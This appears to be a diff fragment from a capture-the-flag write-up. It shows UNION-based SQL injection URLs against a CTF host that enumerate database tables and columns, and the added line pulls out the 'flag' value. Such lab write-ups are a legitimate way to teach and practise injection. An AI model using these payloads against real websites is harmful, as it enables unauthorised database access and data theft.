@@ -16,4 +16,6 @@ https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,GROUP_CONCAT(tabl
 https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,GROUP_CONCAT(column_name) from information_schema.columns where table_name = 'flag'-- -
 ```
 
-
+```bash
+https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,flag from flag-- -
+```
